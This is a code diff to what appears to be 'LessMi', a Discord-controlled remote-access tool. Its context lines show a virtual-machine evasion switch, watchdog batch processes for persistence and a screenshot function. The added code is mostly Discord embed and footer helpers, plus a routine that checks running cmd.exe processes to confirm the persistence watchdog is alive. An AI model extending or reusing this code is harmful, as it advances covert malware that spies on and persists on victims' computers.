@@ -152,12 +152,15 @@ import zipfile
 import glob
 import contextlib
 import platform
+import struct
 import tkinter
 
 try:
     threading.excepthook = lambda a: _crash_exc(a.exc_type, a.exc_value, a.exc_traceback)
 except Exception:
     pass
+
+timestamp=discord.utils.utcnow()
 
 VM_KILL = True
 VM_SCORE_MIN = 5
@@ -988,6 +991,22 @@ def _write_watchdog(st):
             pass
     return ok
 
+def _watch_alive(tag=None):
+    st = _state_read() or {}
+    bats = [os.path.basename(s["bat"]).lower()
+            for s in (st.get("slots") or []) if s.get("bat")]
+    if not bats:
+        return False
+    try:
+        for p in psutil.process_iter(["name", "cmdline"]):
+            if (p.info.get("name") or "").lower() != "cmd.exe":
+                continue
+            cl = " ".join(p.info.get("cmdline") or []).lower()
+            if any(b in cl for b in bats):
+                return True
+    except Exception:
+        pass
+    return False
 
 def _kill_watchdog():
     st = _state_read() or {}
@@ -1287,14 +1306,23 @@ LOGO_URL = "https://raw.githubusercontent.com/MateAGYT/LessMi/main/resources/log
 LOGO_LOCAL = os.path.join(RESOURCES_DIR, "logo.png")
 FOOTER_TEXT = "MateAGYT/LessMi"
 FOOTER_ICON = None
+LOGO_NAME = "logo.png"
 
 
 def _footer_icon():
     return FOOTER_ICON or LOGO_URL
 
 
-def _apply_footer(embed):
-    icon = _footer_icon()
+def _icon_source():
+    if FOOTER_ICON:
+        return FOOTER_ICON, None
+    if os.path.exists(LOGO_LOCAL) and os.path.getsize(LOGO_LOCAL) > 512:
+        return "attachment://" + LOGO_NAME, discord.File(LOGO_LOCAL, filename=LOGO_NAME)
+    return None, None
+
+
+def _apply_footer(embed, icon=None):
+    icon = icon or _footer_icon()
     try:
         if icon:
             embed.set_footer(text=FOOTER_TEXT, icon_url=icon)
@@ -1332,12 +1360,20 @@ async def _prime_footer_icon():
     return FOOTER_ICON
 
 
-def create_embed(title, description, color=None):
+def create_embed(title, description, color=None, author=None, author_icon=None, footer_icon=None):
     try:
-        embed = discord.Embed(title=title, description=description,
+        embed = discord.Embed(title=str(title)[:256], description=str(description)[:4000],
                               color=ACCENT if color is None else color,
-                              timestamp=datetime.now(datetime.timezone.utc))
-        return _apply_footer(embed)
+                              timestamp=discord.utils.utcnow())
+        if author:
+            kw = {"name": str(author)[:256]}
+            if author_icon and author_icon.startswith(("http://", "https://", "attachment://")):
+                kw["icon_url"] = author_icon
+            try:
+                embed.set_author(**kw)
+            except Exception:
+                embed.set_author(name=str(author)[:256])
+        return _apply_footer(embed, footer_icon)
     except Exception:
         _crash("embed", traceback.format_exc())
         embed = discord.Embed(title=str(title)[:256], description=str(description)[:4000])
@@ -1347,6 +1383,13 @@ def create_embed(title, description, color=None):
             pass
         return embed
 
+async def send_embed(dest, title, description, color=None, author=None, with_icon=True):
+    icon, file = _icon_source() if with_icon else (None, None)
+    embed = create_embed(title, description, color, author=author,
+                         author_icon=icon, footer_icon=icon)
+    if file:
+        return await dest.send(embed=embed, file=file)
+    return await dest.send(embed=embed)
 
 def screenshot_all():
     try:
